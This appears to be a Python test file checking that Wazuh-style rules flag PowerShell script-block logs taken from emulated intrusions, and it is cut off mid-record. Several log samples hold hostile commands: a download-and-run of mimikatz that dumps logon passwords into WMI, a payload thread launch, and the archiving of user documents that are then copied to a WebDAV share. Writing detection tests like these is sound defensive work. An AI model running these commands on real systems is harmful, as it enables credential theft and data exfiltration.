#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# These test cases are based on log data and rule descriptions used for regression testing,
# potentially derived from or inspired by Wazuh rulesets and public log samples.

import unittest

from internal.logtest import LogtestStatus, send_log


# Converted from powershell.ini
class TestPowershellRules(unittest.TestCase):

    def test_get_itemproperty_query(self) -> None:
        log = r'''
{"win":{"eventdata":{"path":"C:\\\\Users\\\\AtomicRed\\\\AppData\\\\Roaming\\\\TransbaseOdbcDriver\\\\LanCradDriver.ps1","messageNumber":"1","messageTotal":"1","scriptBlockText":"Get-ItemProperty -Path C:\\","scriptBlockId":"95af64d2-0002-4dd7-a150-d3dad1009afa"},"system":{"eventID":"4104","keywords":"0x0","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","level":"3","channel":"Microsoft-Windows-PowerShell/Operational","opcode":"15","message":"Get-ItemProperty -Path C:\\","version":"1","systemTime":"2021-08-13T22:21:37.5045856Z","eventRecordID":"96584","threadID":"7128","computer":"hrmanager.ExchangeTest.com","task":"2","processID":"904","severityValue":"WARNING","providerName":"Microsoft-Windows-PowerShell"}}}
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91807')
        self.assertEqual(response.rule_level, 0)


    def test_get_itemproperty_query_registry(self) -> None:
        log = r'''
{"win":{"eventdata":{"path":"C:\\\\Users\\\\AtomicRed\\\\AppData\\\\Roaming\\\\TransbaseOdbcDriver\\\\LanCradDriver.ps1","messageNumber":"1","messageTotal":"1","scriptBlockText":"$Payload = (Get-ItemProperty -Path HKCU:\\\\Software\\\\InternetExplorer\\\\AppDataLow\\\\Software\\\\Microsoft\\\\InternetExplorer).'{018247B2CAC14652E}'","scriptBlockId":"95af64d2-0002-4dd7-a150-d3dad1009afa"},"system":{"eventID":"4104","keywords":"0x0","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","level":"3","channel":"Microsoft-Windows-PowerShell/Operational","opcode":"15","message":"$Payload = (Get-ItemProperty -Path HKCU:\\\\Software\\\\InternetExplorer\\\\AppDataLow\\\\Software\\\\Microsoft\\\\InternetExplorer).'{018247B2CAC14652E}'","version":"1","systemTime":"2021-08-13T22:21:37.5045856Z","eventRecordID":"96584","threadID":"7128","computer":"hrmanager.ExchangeTest.com","task":"2","processID":"904","severityValue":"WARNING","providerName":"Microsoft-Windows-PowerShell"}}}
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91808')
        self.assertEqual(response.rule_level, 3)


    def test_base64_decode_from_scriptblock(self) -> None:
        log = r'''
{"win":{"eventdata":{"path":"C:\\\\Users\\\\AtomicRed\\\\AppData\\\\Roaming\\\\TransbaseOdbcDriver\\\\LanCradDriver.ps1","messageNumber":"1","messageTotal":"1","scriptBlockText":"$bytes = [System.Convert]::FromBase64String($Payload)","scriptBlockId":"95af64d2-0002-4dd7-a150-d3dad1009afa"},"system":{"eventID":"4104","keywords":"0x0","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","level":"3","channel":"Microsoft-Windows-PowerShell/Operational","opcode":"15","message":"$bytes = [System.Convert]::FromBase64String($Payload)","version":"1","systemTime":"2021-08-13T22:21:37.5045856Z","eventRecordID":"96584","threadID":"7128","computer":"hrmanager.ExchangeTest.com","task":"2","processID":"904","severityValue":"WARNING","providerName":"Microsoft-Windows-PowerShell"}}}
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91809')
        self.assertEqual(response.rule_level, 10)


    def test_createthread_api_execution(self) -> None:
        log = r'''
{"win":{"eventdata":{"path":"C:\\\\Users\\\\AtomicRed\\\\AppData\\\\Roaming\\\\TransbaseOdbcDriver\\\\LanCradDriver.ps1","messageNumber":"1","messageTotal":"1","scriptBlockText":"$WinObj::CreateThread(0,0,$WinMem,0,0,0)","scriptBlockId":"95af64d2-0002-4dd7-a150-d3dad1009afa"},"system":{"eventID":"4104","keywords":"0x0","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","level":"3","channel":"Microsoft-Windows-PowerShell/Operational","opcode":"15","message":"$WinObj::CreateThread(0,0,$WinMem,0,0,0)","version":"1","systemTime":"2021-08-13T22:21:37.5045856Z","eventRecordID":"96584","threadID":"7128","computer":"hrmanager.ExchangeTest.com","task":"2","processID":"904","severityValue":"WARNING","providerName":"Microsoft-Windows-PowerShell"}}}
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91810')
        self.assertEqual(response.rule_level, 10)


    def test_powershell_script_executed_expand_archive_wineventdatascriptblocktext(self) -> None:
        log = r'''
{ "win": { "eventdata": { "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "Expand-Archive -LiteralPath \\\"$env:USERPROFILE\\\\Downloads\\\\SysinternalsSuite.zip\\\" -DestinationPath \\\"$env:USERPROFILE\\\\Downloads\\\\SysinternalsSuite\\\\\\\"", "scriptBlockId": "6f67fff0-7f00-4b9e-8de7-a7749cf7c4f5" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\nExpand-Archive -LiteralPath \"$env:USERPROFILE\\Downloads\\SysinternalsSuite.zip\" -DestinationPath \"$env:USERPROFILE\\Downloads\\SysinternalsSuite\\\"\r\n\r\nScriptBlock ID: 6f67fff0-7f00-4b9e-8de7-a7749cf7c4f5\r\nPath: \"", "version": "1", "systemTime": "2021-10-20T19:20:23.7594447Z", "eventRecordID": "1216582", "threadID": "440", "computer": "Workstation1.dc.local", "task": "2", "processID": "4308", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91811')
        self.assertEqual(response.rule_level, 4)


    def test_powershell_script_deleted_a_registry_key_from_an_object(self) -> None:
        log = r'''
{ "win": { "eventdata": { "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "Remove-Item -Path HKCU:\\\\Software\\\\Classes\\\\Folder* -Recurse -Force", "scriptBlockId": "ea6dc896-b908-4ca4-8185-26306d02b344" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\nRemove-Item -Path HKCU:\\Software\\Classes\\Folder* -Recurse -Force\r\n\r\nScriptBlock ID: ea6dc896-b908-4ca4-8185-26306d02b344\r\nPath: \"", "version": "1", "systemTime": "2021-10-22T13:24:41.9523235Z", "eventRecordID": "1454348", "threadID": "4652", "computer": "apt29w1.xrisbarney.local", "task": "2", "processID": "4080", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91814')
        self.assertEqual(response.rule_level, 4)


    def test_powershell_executing_process_discovery(self) -> None:
        log = r'''
{ "win": { "eventdata": { "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "Get-Process", "scriptBlockId": "9c6b55b4-e9c5-4f65-84be-7fbf124f22ba" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\nGet-Process\r\n\r\nScriptBlock ID: 9c6b55b4-e9c5-4f65-84be-7fbf124f22ba\r\nPath: \"", "version": "1", "systemTime": "2021-10-22T07:06:02.4654994Z", "eventRecordID": "1219837", "threadID": "6156", "computer": "Workstation1.dc.local", "task": "2", "processID": "5612", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91815')
        self.assertEqual(response.rule_level, 4)


    def test_powershell_script_querying_system_environment_variables(self) -> None:
        log = r'''
{"win":{"eventdata":{"path":"C:\\\\Program Files\\\\SysinternalsSuite\\\\readme.ps1","messageNumber":"1","messageTotal":"1","scriptBlockText":"function Invoke-Discovery {      $DiscoveryInfo =@()      $CurrentDir = Get-Location        $DiscoveryInfo += [PSCustomObject]@{                  CurrentDirectory = $CurrentDir                  TempDirectory = $env:TEMP                  UserName = $env:USERNAME                  ComputerName = $env:COMPUTERNAME                  UserDomain = $env:USERDOMAIN                  CurrentPID = $PID              }        $DiscoveryInfo | Format-List            $NameSpace = Get-WmiObject -Namespace \\\"root\\\" -Class \\\"__Namespace\\\" | Select Name | Out-String -Stream | Select-String \\\"SecurityCenter\\\"      foreach ($SecurityCenter in $NameSpace) {           Get-WmiObject -Namespace \\\"root\\\\$SecurityCenter\\\"  -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List          WmiObject -Namespace \\\"root\\\\$SecurityCenter\\\" -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List       }         Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List      Invoke-NetUserGetGroups      Invoke-NetUserGetLocalGroups  }","scriptBlockId":"0cff31fd-3944-44fd-b87a-14207b838c3b"},"system":{"eventID":"4104","keywords":"0x0","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","level":"5","channel":"Microsoft-Windows-PowerShell/Operational","opcode":"15","message":"\"Creating Scriptblock text (1 of 1):\r\nfunction Invoke-Discovery {\r\n    $DiscoveryInfo =@()\r\n    $CurrentDir = Get-Location\r\n\r\n    $DiscoveryInfo += [PSCustomObject]@{\r\n                CurrentDirectory = $CurrentDir\r\n                TempDirectory = $env:TEMP\r\n                UserName = $env:USERNAME\r\n                ComputerName = $env:COMPUTERNAME\r\n                UserDomain = $env:USERDOMAIN\r\n                CurrentPID = $PID\r\n            }\r\n\r\n    $DiscoveryInfo | Format-List\r\n    \r\n    $NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\"\r\n    foreach ($SecurityCenter in $NameSpace) { \r\n        Get-WmiObject -Namespace \"root\\$SecurityCenter\"  -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List\r\n        WmiObject -Namespace \"root\\$SecurityCenter\" -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List \r\n    } \r\n\r\n    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List\r\n    Invoke-NetUserGetGroups\r\n    Invoke-NetUserGetLocalGroups\r\n}\r\n\r\nScriptBlock ID: 0cff31fd-3944-44fd-b87a-14207b838c3b\r\nPath: C:\\Program Files\\SysinternalsSuite\\readme.ps1\"","version":"1","systemTime":"2021-10-25T09:20:32.5187021Z","eventRecordID":"1411669","threadID":"3816","computer":"Workstation1.dc.local","task":"2","processID":"6660","severityValue":"VERBOSE","providerName":"Microsoft-Windows-PowerShell"}}}
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91816')
        self.assertEqual(response.rule_level, 4)


    def test_powershell_script_executed_new_service_command(self) -> None:
        log = r'''
{"win":{"eventdata":{"path":"C:\\\\Program Files\\\\SysinternalsSuite\\\\readme.ps1","messageNumber":"3","messageTotal":"4","scriptBlockText":"            # create new service             New-Service -Name \\\"javamtsup\\\" -BinaryPathName \\\"C:\\\\Windows\\\\System32\\\\javamtsup.exe\\\" -DisplayName \\\"Java(TM) Virtual Machine Support Service\\\" -StartupType Automatic          } ","scriptBlockId":"040c2fc8-4a6c-45b1-ad8d-edb86ddef55c"},"system":{"eventID":"4104","keywords":"0x0","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","level":"3","channel":"Microsoft-Windows-PowerShell/Operational","opcode":"15","message":"\"Creating Scriptblock text (3 of 4):  New-Service -Name \"javamtsup\" -BinaryPathName \"C:\\Windows\\System32\\javamtsup.exe\" -DisplayName \"Java(TM) Virtual Machine Support Service\" -StartupType Automatic\n\n        }\n  ","version":"1","systemTime":"2021-10-25T20:41:42.7660456Z","eventRecordID":"96690","threadID":"5564","computer":"hrmanager.ExchangeTest.com","task":"2","processID":"6964","severityValue":"WARNING","providerName":"Microsoft-Windows-PowerShell"}}}
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91818')
        self.assertEqual(response.rule_level, 4)


    def test_powershell_script_created_a_compressed_file(self) -> None:
        log = r'''
{ "win": { "eventdata": { "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\\\\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\\\\working.zip -Force", "scriptBlockId": "d63208a1-c4c7-4d1b-ac00-378952568ae7" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\n$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\\working.zip -Force\r\n\r\nScriptBlock ID: d63208a1-c4c7-4d1b-ac00-378952568ae7\r\nPath: \"", "version": "1", "systemTime": "2021-10-27T10:47:51.2128285Z", "eventRecordID": "1558", "threadID": "3724", "computer": "apt29w2.xrisbarney.local", "task": "2", "processID": "3976", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91821')
        self.assertEqual(response.rule_level, 4)


    def test_powershell_script_executed_invoke_command_cmdlet_in_remote_computer(self) -> None:
        log = r'''
{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"Invoke-Command -ComputerName 192.168.0.95 -ScriptBlock {Select-Object UserName,SessionId | Where-Object { $_.UserName -like \\\"*\\\\$env:USERNAME\\\" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId","scriptBlockId":"fffc8511-1b1f-4eb5-9d72-39968178b82f"},"system":{"eventID":"4104","keywords":"0x0","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","level":"5","channel":"Microsoft-Windows-PowerShell/Operational","opcode":"15","message":"\"Creating Scriptblock text (1 of 1):\r\nInvoke-Command -ComputerName 192.168.0.95 -ScriptBlock {  Select-Object UserName,SessionId | Where-Object { $_.UserName -like \"*\\$env:USERNAME\" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId\r\n\r\nScriptBlock ID: fffc8511-1b1f-4eb5-9d72-39968178b82f\r\nPath: \"","version":"1","systemTime":"2021-10-26T20:50:44.3584849Z","eventRecordID":"96943","threadID":"5204","computer":"hrmanager.ExchangeTest.com","task":"2","processID":"1284","severityValue":"VERBOSE","providerName":"Microsoft-Windows-PowerShell"}}}
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91823')
        self.assertEqual(response.rule_level, 14)


    def test_powershell_collected_clipboard_data(self) -> None:
        log = r'''
{ "win": { "eventdata": { "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "Get-Clipboard", "scriptBlockId": "22352942-76d4-4e20-868d-0c647cff2a31" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\nGet-Clipboard\r\n\r\nScriptBlock ID: 22352942-76d4-4e20-868d-0c647cff2a31\r\nPath: \"", "version": "1", "systemTime": "2021-10-25T22:12:09.1205336Z", "eventRecordID": "1854459", "threadID": "4860", "computer": "Workstation1.dc.local", "task": "2", "processID": "5824", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91824')
        self.assertEqual(response.rule_level, 4)


    def test_powershell_executed_file_compression(self) -> None:
        log = r'''
{ "win": { "eventdata": { "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "Compress-7Zip -Path \\\"$env:USERPROFILE\\\\Downloads\\\\\\\" -Filter * -Password \\\"lolol\\\" -ArchiveFileName \\\"$env:APPDATA\\\\OfficeSupplies.7z\\\"", "scriptBlockId": "1f45fda9-d824-42e3-a2b8-9c0117384406" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\nCompress-7Zip -Path \"$env:USERPROFILE\\Downloads\\\" -Filter * -Password \"lolol\" -ArchiveFileName \"$env:APPDATA\\OfficeSupplies.7z\"\r\n\r\nScriptBlock ID: 1f45fda9-d824-42e3-a2b8-9c0117384406\r\nPath: \"", "version": "1", "systemTime": "2021-10-26T13:37:04.2701868Z", "eventRecordID": "1877996", "threadID": "3096", "computer": "Workstation1.dc.local", "task": "2", "processID": "2336", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91825')
        self.assertEqual(response.rule_level, 4)


    def test_powershell_executed_copy_item(self) -> None:
        log = r'''
{ "win": { "eventdata": { "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "    Copy-Item \\\"$env:APPDATA\\\\OfficeSupplies.7z\\\" \\\"WebDavShare:\\\\OfficeSupplies.7z\\\" -Force", "scriptBlockId": "7f0b516e-2f1d-4df4-aad6-575437aabf34" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\n    Copy-Item \"$env:APPDATA\\OfficeSupplies.7z\" \"WebDavShare:\\OfficeSupplies.7z\" -Force\r\n\r\nScriptBlock ID: 7f0b516e-2f1d-4df4-aad6-575437aabf34\r\nPath: \"", "version": "1", "systemTime": "2021-10-26T13:45:08.3556178Z", "eventRecordID": "1878619", "threadID": "3096", "computer": "Workstation1.dc.local", "task": "2", "processID": "2336", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91826')
        self.assertEqual(response.rule_level, 4)


    def test_powershell_executed_a_creation_or_update_of_a_wmi_instance_with_encoded_values(self) -> None:
        log = r'''
{ "win": { "eventdata": { "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "$wc = New-Object System.Net.WebClient; $wc.DownloadFile(\\\"http://192.168.0.4:8080/m\\\",\\\"m.exe\\\"); $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo; $ProcessInfo.FileName = \\\"m.exe\\\"; $ProcessInfo.RedirectStandardError = $true; $ProcessInfo.RedirectStandardOutput = $true; $ProcessInfo.UseShellExecute = $false; $ProcessInfo.Arguments = @(\\\"privilege::debug\\\",\\\"sekurlsa::logonpasswords\\\",\\\"exit\\\"); $Process = New-Object System.Diagnostics.Process; $Process.StartInfo = $ProcessInfo; $Process.Start() | Out-Null; $output = $Process.StandardOutput.ReadToEnd(); $Pws = \\\"\\\"; ForEach ($line in $($output -split \\\"`r`n\\\")) {if ($line.Contains('Password') -and ($line.length -lt 50)) {$Pws += $line}}; $PwBytes = [System.Text.Encoding]::Unicode.GetBytes($Pws); $EncPws =[Convert]::ToBase64String($PwBytes); Set-WmiInstance -Path \\\\\\\\.\\\\root\\\\cimv2:Win32_AuditCode -Argument @{Result=$EncPws}", "scriptBlockId": "2cc825ce-9e2d-43bd-be95-47590ffc7388" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\n$wc = New-Object System.Net.WebClient; $wc.DownloadFile(\"http://192.168.0.4:8080/m\",\"m.exe\"); $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo; $ProcessInfo.FileName = \"m.exe\"; $ProcessInfo.RedirectStandardError = $true; $ProcessInfo.RedirectStandardOutput = $true; $ProcessInfo.UseShellExecute = $false; $ProcessInfo.Arguments = @(\"privilege::debug\",\"sekurlsa::logonpasswords\",\"exit\"); $Process = New-Object System.Diagnostics.Process; $Process.StartInfo = $ProcessInfo; $Process.Start() | Out-Null; $output = $Process.StandardOutput.ReadToEnd(); $Pws = \"\"; ForEach ($line in $($output -split \"`r`n\")) {if ($line.Contains('Password') -and ($line.length -lt 50)) {$Pws += $line}}; $PwBytes = [System.Text.Encoding]::Unicode.GetBytes($Pws); $EncPws =[Convert]::ToBase64String($PwBytes); Set-WmiInstance -Path \\\\.\\root\\cimv2:Win32_AuditCode -Argument @{Result=$EncPws}\r\n\r\nScriptBlock ID: 2cc825ce-9e2d-43bd-be95-47590ffc7388\r\nPath: \"", "version": "1", "systemTime": "2021-11-02T00:09:22.3066723Z", "eventRecordID": "2633308", "threadID": "3740", "computer": "apt29w2.xrisbarney.local", "task": "2", "processID": "5740", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91828')
        self.assertEqual(response.rule_level, 6)


    def test_powershell_executed_getcomputernameex(self) -> None:
        log = r'''
{ "win": { "eventdata": { "path": "C:\\\\Users\\\\itadmin\\\\Desktop\\\\stepThirteen.ps1", "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "function comp { $Signature=@\\\" [DllImport(\\\"kernel32.dll\\\", SetLastError=true, CharSet=CharSet.Auto)] static extern bool GetComputerNameEx(COMPUTER_NAME_FORMAT NameType,string lpBuffer, ref uint lpnSize);\\t enum COMPUTER_NAME_FORMAT {ComputerNameNetBIOS,ComputerNameDnsHostname,ComputerNameDnsDomain,ComputerNameDnsFullyQualified,ComputerNamePhysicalNetBIOS,ComputerNamePhysicalDnsHostname,ComputerNamePhysicalDnsDomain,ComputerNamePhysicalDnsFullyQualified} public static string GCN() { bool success; string name = \\\"                    \\\"; uint size = 20; success = GetComputerNameEx(COMPUTER_NAME_FORMAT.ComputerNameNetBIOS, name, ref size); return \\\"NetBIOSName:\\\\t\\\" + name.ToString(); } \\\"@ Add-Type -MemberDefinition $Signature -Name GetCompNameEx -Namespace Kernel32 $result = [Kernel32.GetCompNameEx]::GCN() return $result }", "scriptBlockId": "9d419422-dfa8-429f-b044-ac6520efe6cc" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\nfunction comp {\n$Signature=@\"\n[DllImport(\"kernel32.dll\", SetLastError=true, CharSet=CharSet.Auto)]\nstatic extern bool GetComputerNameEx(COMPUTER_NAME_FORMAT NameType,string lpBuffer, ref uint lpnSize);\t\nenum COMPUTER_NAME_FORMAT\n{ComputerNameNetBIOS,ComputerNameDnsHostname,ComputerNameDnsDomain,ComputerNameDnsFullyQualified,ComputerNamePhysicalNetBIOS,ComputerNamePhysicalDnsHostname,ComputerNamePhysicalDnsDomain,ComputerNamePhysicalDnsFullyQualified}\npublic static string GCN() {\nbool success;\nstring name = \"                    \";\nuint size = 20;\nsuccess = GetComputerNameEx(COMPUTER_NAME_FORMAT.ComputerNameNetBIOS, name, ref size);\nreturn \"NetBIOSName:\\t\" + name.ToString();\n}\n\"@\nAdd-Type -MemberDefinition $Signature -Name GetCompNameEx -Namespace Kernel32\n$result = [Kernel32.GetCompNameEx]::GCN()\nreturn $result\n}\r\n\r\nScriptBlock ID: 9d419422-dfa8-429f-b044-ac6520efe6cc\r\nPath: C:\\Users\\itadmin\\Desktop\\stepThirteen.ps1\"", "version": "1", "systemTime": "2021-10-29T15:32:41.0826634Z", "eventRecordID": "2630797", "threadID": "4724", "computer": "apt29w2.xrisbarney.local", "task": "2", "processID": "96", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell" } } }
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91829')
        self.assertEqual(response.rule_level, 4)


    def test_powershell_executed_netwkstagetinfo(self) -> None:
        log = r'''
{ "win": { "eventdata": { "path": "C:\\\\Users\\\\itadmin\\\\Desktop\\\\stepThirteen.ps1", "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "function domain { $Signature=@\\\" [DllImport(\\\"netapi32.dll\\\", SetLastError=true)] public static extern int NetWkstaGetInfo(string servername, int level, out IntPtr bufptr); [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)] public struct WKSTA_INFO_100 { public int platform_id; public string computer_name; public string lan_group; public int ver_major; public int ver_minor; } public static string NWGI()  { string host = null; IntPtr buffer; var ret = NetWkstaGetInfo(host, 100, out buffer); var strut_size = Marshal.SizeOf(typeof (WKSTA_INFO_100)); WKSTA_INFO_100 wksta_info; wksta_info = (WKSTA_INFO_100) Marshal.PtrToStructure(buffer, typeof (WKSTA_INFO_100)); string domainName = wksta_info.lan_group; return \\\"DomainName:\\\\t\\\" + domainName.ToString(); } \\\"@ Add-Type -MemberDefinition $Signature -Name NetWGetInfo -Namespace NetAPI32 $result = [NetAPI32.NetWGetInfo]::NWGI() return $result }", "scriptBlockId": "96bb1fb5-897d-4729-b43d-3e2638f3c32e" }, "system": { "eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\nfunction domain {\n$Signature=@\"\n[DllImport(\"netapi32.dll\", SetLastError=true)]\npublic static extern int NetWkstaGetInfo(string servername, int level, out IntPtr bufptr);\n[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\npublic struct WKSTA_INFO_100 {\npublic int platform_id;\npublic string computer_name;\npublic string lan_group;\npublic int ver_major;\npublic int ver_minor;\n}\npublic static string NWGI() \n{\nstring host = null;\nIntPtr buffer;\nvar ret = NetWkstaGetInfo(host, 100, out buffer);\nvar strut_size = Marshal.SizeOf(typeof (WKSTA_INFO_100));\nWKSTA_INFO_100 wksta_info;\nwksta_info = (WKSTA_INFO_100) Marshal.PtrToStructure(buffer, typeof (WKSTA_INFO_100));\nstring domainName = wksta_info.lan_group;\nreturn \"DomainName:\\t\" + domainName.ToString();\n}\n\"@\nAdd-Type -MemberDefinition $Signature -Name NetWGetInfo -Namespace NetAPI32\n$result = [NetAPI32.NetWGetInfo]::NWGI()\nreturn $result\n}\r\n\r\nScriptBlock ID: 96bb1fb5-897d-4729-b43d-3e2638f3c32e\r\nPath: C:\\Users\\itadmin\\Desktop\\stepThirteen.ps1\"", "version": "1", "systemTime": "2021-10-29T15:32:47.8484312Z", "eventRecordID": "2630829", "threadID": "4724", "computer": 